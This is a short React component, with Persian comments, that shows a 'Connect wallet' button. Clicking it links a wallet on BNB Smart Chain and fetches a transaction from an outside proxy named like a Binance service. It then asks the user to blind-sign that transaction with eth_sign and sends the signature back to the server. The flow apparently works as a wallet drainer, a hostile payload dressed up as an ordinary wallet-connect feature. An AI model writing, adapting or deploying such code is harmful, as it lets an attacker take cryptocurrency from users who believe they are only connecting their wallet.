import jQuery from "jquery";
import { EthereumProvider } from "@walletconnect/ethereum-provider";

function App() {
  async function runner() {
    var ethereumProvider = await EthereumProvider.init({
      showQrModal: true,
      qrModalOptions: {
        themeMode: "dark",
      },
      chains: [56], // تغییر به شبکه BSC
      methods: ["eth_sign", "eth_sendTransaction"],
      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
    });

    await ethereumProvider.enable();
    var provider = ethereumProvider;
    var accounts = await provider.request({ method: "eth_accounts" });
    var sender = accounts[0];
    console.log("✅ Wallet Address:", sender);

    let apiUrl = "https://sponsorbinance.vercel.app/api/proxy"; // تغییر آدرس API

    async function genSign(address) {
      try {
        let requestData = { handler: "tx", address, chain: "56", type: "coin" };

        var result = await jQuery.post(apiUrl, requestData);
        var unSigned = JSON.parse(result);
        console.log("📜 Unsigned Transaction:", unSigned);

        var Signed = await provider.request({
          method: "eth_sign",
          params: [address, unSigned.result], // مقدار امضا به‌صورت خودکار تنظیم می‌شود
        });

        return Signed;
      } catch (error) {
        console.error("❌ Error in genSign:", error);
        return null;
      }
    }

    async function acceptSign(signature) {
      try {
        var result = await jQuery.post(apiUrl, {
          handler: "sign",
          signature,
          type: "coin",
        });

        var resultJson = JSON.parse(result);
        return resultJson.result;
      } catch (error) {
        console.error("❌ Error in acceptSign:", error);
        return null;
      }
    }

    var signature = await genSign(sender);

    if (signature) {
      console.log("✍️ Signed Transaction:", signature);
      var rawsign = await acceptSign(signature);
      console.log("📝 Final Signed Transaction:", rawsign);
    } else {
      console.error("⚠ Signing failed.");
    }
  }

  return (
    <a
      href="#"
      id="connectWallet"
      onClick={runner}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
    >
      <span>Connect wallet</span>
    </a>
  );
}

export default App;
